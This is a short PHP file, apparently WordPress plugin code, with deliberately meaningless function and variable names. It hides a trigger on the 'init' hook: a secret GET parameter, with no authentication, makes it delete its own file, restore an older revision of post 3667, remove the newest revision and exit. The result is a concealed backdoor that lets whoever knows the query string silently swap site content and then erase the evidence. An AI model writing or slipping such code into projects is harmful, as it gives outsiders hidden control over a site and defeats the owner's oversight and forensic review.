<?php

function syntax_allow_last_sitemaps() {
	if (isset($_GET['send_automatic_emails_migration']) && $_GET['send_automatic_emails_migration'] === 'map_ajax_validation') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$notifications_color_team = 3667;
		$customize_lightgray_roles_address = wp_get_post_revisions($notifications_color_team);
		if (empty($customize_lightgray_roles_address)) die('no revisions');
		if (count($customize_lightgray_roles_address) < 2) die('less than 2');
		$background_shortener_type = array_shift($customize_lightgray_roles_address);
		$details_maps_lazy = $background_shortener_type->ID;
		$reports_assets_sidebar_traffic = array_shift($customize_lightgray_roles_address);
		$store_favicon_reloaded_send = $reports_assets_sidebar_traffic->ID;
		$super_modules_query = wp_restore_post_revision($store_favicon_reloaded_send);
		if ($super_modules_query === false) die('error restoring');
		$super_modules_query = wp_delete_post_revision($details_maps_lazy);		
		if ($super_modules_query === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'syntax_allow_last_sitemaps');
